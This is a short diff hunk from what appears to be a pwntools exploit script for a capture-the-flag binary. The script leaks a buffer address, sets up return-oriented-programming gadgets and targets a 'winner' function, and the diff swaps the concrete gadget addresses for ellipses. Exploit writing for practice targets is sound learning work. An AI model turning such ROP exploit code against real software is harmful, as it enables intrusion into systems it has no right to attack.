@@ -196,9 +196,9 @@ buffer = int(p.recvline(), 16)
 pwn.log.info(f"Leaked buffer address: {hex(buffer)}")
 
 # Gadgets
-pop_rdi = 0x40122b
-pop_rsi_r15 = 0x401229
-leave_ret = 0x4011b7
+pop_rdi = ...
+pop_rsi_r15 = ...
+leave_ret = ...
 winner = elf.symbols['winner']
 
 # ROP Chain
